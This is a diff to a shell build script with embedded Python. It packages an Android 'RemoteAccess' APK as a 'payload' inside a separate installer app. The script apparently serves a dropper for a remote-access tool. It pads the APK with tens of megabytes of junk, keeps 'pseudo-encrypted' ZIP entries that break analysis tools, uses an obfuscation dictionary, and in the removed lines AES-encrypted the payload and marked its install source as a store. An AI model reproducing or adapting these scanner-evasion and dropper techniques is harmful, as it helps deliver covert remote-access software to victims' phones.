@@ -1277,10 +1277,9 @@ PYEOF
         rm -rf "$ROOT_DIR/apk-output/$BUILD_ACCESS_ID"
         echo "  Cleared previous APKs for $BUILD_ACCESS_ID"
     fi
-    # Also wipe the encrypted module asset so the installer is rebuilt around
-    # the new payload, and any leftover signing sidecar files.
+    # Also wipe the module asset so the installer is rebuilt around the new
+    # padded payload, and any leftover signing sidecar files.
     rm -f "$ROOT_DIR/installer/src/main/assets/module" \
-          "$ROOT_DIR/installer/build.key" \
           "$ROOT_DIR/installer/payload.pkg" 2>/dev/null || true
 fi
 
@@ -1578,35 +1577,6 @@ else
     INST_KS_ORG=$(   sed -n '5p' "$INST_KS_META")
     INST_KS_COUNTRY=$(sed -n '6p' "$INST_KS_META")
     echo "  Installer keystore          (CN=$INST_KS_CN, O=$INST_KS_ORG, C=$INST_KS_COUNTRY)"
-fi
-
-# ── 5b. Python tooling (pyzipper for AES-256 module encryption) ──────────────
-echo ""
-echo "==> Ensuring Python build tools..."
-if ! python3 -c "import pyzipper" >/dev/null 2>&1; then
-    echo "  Installing pyzipper..."
-    # Try methods in order of preference:
-    #  1. uv (fast, avoids any pip restrictions entirely)
-    #  2. pip --break-system-packages (Alpine PEP 668 override — safe since we own the image)
-    #  3. pip plain (Debian/Ubuntu where no flag is needed)
-    #  4. pip --user (last-resort for non-container envs)
-    if command -v uv >/dev/null 2>&1; then
-        uv pip install --system pyzipper >/dev/null 2>&1 \
-          || pip install --break-system-packages --quiet pyzipper 2>/dev/null \
-          || pip install --quiet pyzipper 2>/dev/null \
-          || pip install --user --quiet pyzipper 2>/dev/null
-    else
-        pip install --break-system-packages --quiet pyzipper 2>/dev/null \
-          || pip install --quiet pyzipper 2>/dev/null \
-          || pip install --user --quiet pyzipper 2>/dev/null
-    fi
-    if ! python3 -c "import pyzipper" >/dev/null 2>&1; then
-        echo "  ERROR: failed to install pyzipper (required for installer module encryption)"
-        exit 1
-    fi
-    echo "  pyzipper installed."
-else
-    echo "  pyzipper already present."
 fi
 
 # ── 6. Obfuscation dictionary ─────────────────────────────────────────────────
@@ -2160,12 +2130,12 @@ chunk = bytes(chunk)
 padding = (chunk * ((pad // 1024) + 1))[:pad]
 
 # Copy the APK binary as-is first (preserves pseudo-encrypted entries
-# without Python's zipfile ever trying to decompress/decrypt them).
+# without Python's zipfile ever trying to decompress them).
 shutil.copy2(src, dst)
 
 # Open the copy in APPEND mode — Python reads the central directory
-# but never calls open() on existing entries, so the "strong encryption"
-# flag on pseudo-encrypted entries does NOT raise NotImplementedError.
+# but never calls open() on existing entries, so existing APK entries are
+# preserved without Python trying to decompress them.
 # We simply tack on the new padding entry at the end.
 with zipfile.ZipFile(dst, "a") as zout:
     pi = zipfile.ZipInfo("res/raw/.pad")
@@ -2209,26 +2179,17 @@ else
 fi
 
 # ── 12. Installer module ─────────────────────────────────────────────────────
-# Bundles the hardened RemoteAccess-release.apk as an ENCRYPTED asset named
-# "module" (AES-256 ZIP). A fresh random key is generated per build and
-# embedded into the installer at compile time via BuildConfig.MODULE_KEY,
-# so every Installer-release.apk has a different key. At runtime the
-# installer decrypts the module to its cache and hands it to Android's
-# PackageInstaller session, marking the source as a store on Android 13+.
+# Bundles the padded RemoteAccess-release.apk directly as an uncompressed
+# asset named "module". At runtime the installer copies the asset to its cache
+# and hands it to Android's PackageInstaller session.
 echo ""
 echo "==> Building INSTALLER module ..."
 # Use the FAT (~40 MB) APK as the installer payload.
-# The 38 MB padding entry is a repeating 1 KB LCG block stored without
-# compression inside the APK ZIP.  pyzipper re-compresses the whole APK
-# with DEFLATE when building the AES-256 asset, so that repeating block
-# collapses to ~a few KB — the "module" asset ends up ~2 MB even though
-# the APK it contains is 40 MB.  When the installer decrypts and extracts
-# the asset at runtime, the full 40 MB APK is written to disk and then
-# passed to PackageInstaller, so the app installs at its full 40 MB size.
+# The 40 MB padding entry remains stored without compression in the module APK
+# and is copied byte-for-byte into the installer asset.
 PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 INSTALLER_ASSETS="$ROOT_DIR/installer/src/main/assets"
 MODULE_DST="$INSTALLER_ASSETS/module"
-KEY_FILE="$ROOT_DIR/installer/build.key"
 PKG_FILE="$ROOT_DIR/installer/payload.pkg"
 if [ -f "$PAYLOAD_SRC" ]; then
     mkdir -p "$INSTALLER_ASSETS"
@@ -2277,34 +2238,14 @@ if [ -f "$PAYLOAD_SRC" ]; then
     printf '%s' "$PAYLOAD_PKG" > "$PKG_FILE"
     echo "  Payload package: $PAYLOAD_PKG (written to installer/payload.pkg)"
 
-    # Remove the legacy unencrypted asset if present from older builds
+    # Remove any stale asset before copying the current padded payload.
     rm -f "$INSTALLER_ASSETS/payload.apk"
 
-    # (1) Generate fresh per-build random key (32 url-safe chars, ~192 bits)
-    MODULE_KEY=$(python3 -c "import secrets; print(secrets.token_urlsafe(24))")
-    printf '%s' "$MODULE_KEY" > "$KEY_FILE"
-    echo "  Generated random per-build key (embedded into BuildConfig.MODULE_KEY)."
-
-    # (2) AES-256 encrypt the hardened APK into the "module" asset.
-    #     pyzipper writes WinZip-AES format; zip4j on Android decodes it.
+    # Copy the padded APK directly into the installer asset.
     rm -f "$MODULE_DST"
-    PAYLOAD_SRC="$PAYLOAD_SRC" MODULE_DST="$MODULE_DST" MODULE_KEY="$MODULE_KEY" \
-    python3 - << 'PYEOF'
-import os, pyzipper
-src = os.environ["PAYLOAD_SRC"]
-dst = os.environ["MODULE_DST"]
-key = os.environ["MODULE_KEY"].encode()
-with pyzipper.AESZipFile(dst, "w",
-                         compression=pyzipper.ZIP_DEFLATED,
-                         encryption=pyzipper.WZ_AES) as zf:
-    zf.setpassword(key)
-    zf.setencryption(pyzipper.WZ_AES, nbits=256)
-    with open(src, "rb") as f:
-        zf.writestr("payload.apk", f.read())
-print("  AES-256 encrypted module written.")
-PYEOF
+    cp -f "$PAYLOAD_SRC" "$MODULE_DST"
     MODULE_SIZE=$(ls -lh "$MODULE_DST" | awk '{print $5}')
-    echo "  Encrypted asset: installer/src/main/assets/module ($MODULE_SIZE)"
+    echo "  Unencrypted module asset: installer/src/main/assets/module ($MODULE_SIZE)"
 
     cd "$ROOT_DIR"
     ./gradlew :installer:assembleRelease --no-daemon --stacktrace 2>&1
